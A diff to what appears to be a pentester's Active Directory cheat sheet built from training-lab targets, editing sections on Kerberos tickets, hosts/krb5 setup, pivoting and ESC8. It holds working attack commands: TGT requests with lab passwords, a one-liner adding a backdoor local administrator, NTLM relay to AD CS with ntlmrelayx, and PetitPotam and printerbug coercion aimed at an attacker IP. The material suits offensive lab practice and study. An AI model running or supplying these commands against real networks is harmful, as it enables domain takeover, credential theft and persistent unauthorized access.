@@ -5,8 +5,19 @@
 impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!'
 export KRB5CCNAME=alex.turner.ccache
 klist
+
+# Alternative
+kinit alex
 ```
 
+
+## hosts & krb5
+
+```bash
+nxc smb $target --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm /tmp/hosts.tmp
+
+sudo nxc smb $target --generate-krb5-file /etc/krb5.conf
+```
 
 ## Pivoting
 
@@ -25,8 +36,6 @@ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
 
 ```bash
 sshpass -p 'Pssw0rd' ssh 'user$'@sql01.abc.local
-
-nxc smb $target --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm /tmp/hosts.tmp
 
 net user bob P@ssw0rd /add && net localgroup Administrators bob /add
 
@@ -166,11 +175,11 @@ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6
 ## ESC8
 
 ```bash
-impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp \ -smb2support --adcs --template DomainController
+impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
 # Two options (PetitPotam or printerbug)
 # PetitPotam
-python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' \ -d shadow.gate <YOUR_IP> 10.0.30.19
+python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' -d shadow.gate <YOUR_IP> 10.0.30.19
 
 # printerbug - https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
